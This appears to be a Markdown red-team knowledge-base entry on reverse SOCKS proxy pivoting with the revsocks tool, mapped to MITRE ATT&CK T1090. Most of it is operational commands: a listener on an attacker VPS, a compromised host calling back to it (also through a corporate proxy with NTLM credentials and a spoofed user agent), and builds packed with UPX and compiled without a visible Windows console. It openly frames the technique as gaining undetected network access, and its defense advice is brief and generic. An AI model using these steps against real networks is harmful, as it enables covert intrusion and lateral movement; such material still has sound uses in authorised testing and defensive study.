---
id: 96f8e7e4-343c-4701-81f1-d8a5ae47c20c
name: Reverse Socks Proxy Pivoting
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:22.931394+00:00'
updated_at: '2023-04-10T20:25:18.370260+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Connection Proxy|T1090 - Connection Proxy]]'
tags:
- '[[Network Pivoting Techniques]]'
- '[[revsocks]]'
commands:
- '[[Build executable for Linux]]'
- '[[Build executable for Windows]]'
- '[[Clone repository from GitHub]]'
- '[[Compress executable for Linux]]'
- '[[Compress executable for Windows]]'
- '[[Connect client to the server]]'
- '[[Connect client to the server with proxy]]'
- '[[Create SOCKS 5 proxy on port 1080]]'
- '[[Install go-ntlmssp package]]'
- '[[Install go-ntlmssp package]]'
- '[[Install go-socks5 package]]'
- '[[Install go-socks5 package]]'
- '[[Install yamux package]]'
- '[[Install yamux package]]'
- '[[Set GOPATH environment variable]]'
---

# Reverse Socks Proxy Pivoting

## Summary

Reverse Socks Proxy pivoting is a technique used by attackers to gain access to a target network through a compromised host. This technique involves the attacker setting up a reverse socks proxy on the compromised host, which allows the attacker to connect to the target network through the compromi

## Description

# Description

Reverse Socks Proxy pivoting is a technique used by attackers to gain access to a target network through a compromised host. This technique involves the attacker setting up a reverse socks proxy on the compromised host, which allows the attacker to connect to the target network through the compromised host. This technique can be used to bypass firewalls and other network security measures that may be in place.

From a technical perspective, the attacker sets up a reverse socks proxy on the compromised host, which listens on a specific port. The attacker then connects to the compromised host using a socks client, which connects to the reverse socks proxy. The attacker can then use the reverse socks proxy to connect to hosts on the target network.

The business value of this technique is that it allows attackers to gain access to a target network without being detected, as the traffic appears to be coming from a legitimate host on the network. This can lead to data theft, system compromise, and other malicious activities.

## Requirements

1. Access to a compromised host with the ability to install and run software

## Defense

1. Monitor network traffic for suspicious activity, including connections to non-standard ports

1. Implement network segmentation to limit the impact of a compromised host

1. Use multi-factor authentication to prevent unauthorized access to sensitive systems

## Objectives

1. Gain access to a target network through a compromised host

# Instructions

1. To create a reverse SOCKS 5 proxy, follow these steps:
1. Listen on the server and create a SOCKS 5 proxy on port 1080 using the command:
	./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass <password>
2. Connect the client to the server using the command:
	./revsocks -connect <server_ip>:8443 -pass <password>

Optional arguments:
- Use the -proxy flag to specify a proxy server and its port number.
- Use the -proxyauth flag to specify the proxy server's authentication credentials in the format 'Domain/username:password'.
- Use the -useragent flag to specify the user agent string to use in the HTTP requests.

**Code**: [[# Listen on the server and create a SOCKS 5 proxy ]]

> The reverse SOCKS 5 proxy allows a client to connect to a server and use its network connections. This can be useful in situations where the client is behind a firewall or NAT and cannot connect directly to the server. The -listen flag specifies the server's listening address and port number, while the -socks flag specifies the address and port number of the local SOCKS 5 proxy. The -connect flag specifies the server's IP address and port number. The -pass flag specifies the password to use for authentication.

**Command** ([[Create SOCKS 5 proxy on port 1080]]):

```bash
user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234
```

**Command** ([[Connect client to the server]]):

```bash
user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234
```

**Command** ([[Connect client to the server with proxy]]):

```bash
user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"
```

2. To build revsocks for Linux, follow these steps:
1. Clone the repository using the following command: git clone https://github.com/kost/revsocks
2. Set the GOPATH to ~/go
3. Get the required dependencies using the following commands:
	- go get github.com/hashicorp/yamux
	- go get github.com/armon/go-socks5
	- go get github.com/kost/go-ntlmssp
4. Build the executable using the command: go build
5. Compress the executable using the command: upx --brute revsocks

To build revsocks for Windows, follow these steps:
1. Get the required dependencies using the following commands:
	- go get github.com/hashicorp/yamux
	- go get github.com/armon/go-socks5
	- go get github.com/kost/go-ntlmssp
2. Set the GOOS and GOARCH environment variables to windows and amd64 respectively
3. Build the executable using the command: go build
4. Set the ldflags to "-s -w"
5. Build the executable again with the ldflags set to "-H=windowsgui"
6. Compress the executable using the command: upx revsocks

**Code**: [[# Build for Linux
git clone https://github.com/kos]]

> This command is used to build the revsocks executable for both Linux and Windows operating systems. The command provides step-by-step instructions to build the executable for both operating systems. The instructions include cloning the repository, setting the environment variables, getting the required dependencies, building the executable, and compressing the executable. The command also explains the purpose of each step and the arguments used in the commands.

**Command** ([[Clone repository from GitHub]]):

```bash
git clone https://github.com/kost/revsocks
```

**Command** ([[Set GOPATH environment variable]]):

```bash
export GOPATH=~/go
```

**Command** ([[Install yamux package]]):

```bash
go get github.com/hashicorp/yamux
```

**Command** ([[Install go-socks5 package]]):

```bash
go get github.com/armon/go-socks5
```

**Command** ([[Install go-ntlmssp package]]):

```bash
go get github.com/kost/go-ntlmssp
```

**Command** ([[Build executable for Linux]]):

```bash
go build
```

**Command** ([[Compress executable for Linux]]):

```bash
upx --brute revsocks
```

**Command** ([[Install yamux package]]):

```bash
go get github.com/hashicorp/yamux
```

**Command** ([[Install go-socks5 package]]):

```bash
go get github.com/armon/go-socks5
```

**Command** ([[Install go-ntlmssp package]]):

```bash
go get github.com/kost/go-ntlmssp
```

**Command** ([[Build executable for Windows]]):

```bash
GOOS=windows GOARCH=amd64 go build
```

**Command** ([[Compress executable for Windows]]):

```bash
upx revsocks
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Connection Proxy|T1090 - Connection Proxy]]

## Commands Used

- [[Build executable for Linux]]
- [[Build executable for Windows]]
- [[Clone repository from GitHub]]
- [[Compress executable for Linux]]
- [[Compress executable for Windows]]
- [[Connect client to the server]]
- [[Connect client to the server with proxy]]
- [[Create SOCKS 5 proxy on port 1080]]
- [[Install go-ntlmssp package]]
- [[Install go-ntlmssp package]]
- [[Install go-socks5 package]]
- [[Install go-socks5 package]]
- [[Install yamux package]]
- [[Install yamux package]]
- [[Set GOPATH environment variable]]

## Tags

- [[Network Pivoting Techniques]]
- [[revsocks]]
